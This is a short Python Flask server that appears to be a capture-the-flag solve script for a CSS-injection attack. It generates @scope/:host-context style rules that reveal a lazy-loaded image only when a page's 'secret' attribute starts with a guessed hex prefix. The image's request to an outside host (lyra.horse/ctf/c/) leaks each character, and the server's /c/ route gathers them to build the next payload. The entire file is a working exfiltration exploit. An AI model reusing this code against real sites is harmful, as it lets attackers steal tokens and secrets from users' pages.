#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, make_response

app = Flask(__name__)

templ = """<style>
img { display: none }
@scope (:host-context(body[secret^="KNOWNCHAR"])) { #iCHAR { display: block!important } }
</style>
<img loading="lazy" id=iCHAR src=https://lyra.horse/ctf/c/KNOWNCHAR >"""

def getPayload(known=""):
    p1 = """<style>
img { display: none }
"""
    p2 = """</style>\n"""

    for c1 in "0123456789abcdef":
        for c2 in "0123456789abcdef":
            CHAR=f"{c1}{c2}"
            p1 += '@scope (:host-context(body[secret^="KNOWNCHAR"])) { img[style=CHAR] { display: block!important } }\n'.replace("KNOWN",known).replace("CHAR",CHAR)
            p2 += '<img loading="lazy" style=CHAR src=https://lyra.horse/ctf/c/KNOWNCHAR >\n'.replace("KNOWN",known).replace("CHAR",CHAR)
    return p1 + p2


known = ""

@app.route("/rebane")
def index():
    global known
    response = make_response(getPayload(known), 200)
    response.mimetype = "text/plain"
    return response

@app.route("/c/<char>")
def getChar(char):
    global known
    print("Got: " + char)
    known += char
    print(getPayload(known))
    print("Got: " + char)

if __name__ == "__main__":
    print(getPayload())
    app.run(debug=False, host="0.0.0.0", port="1337")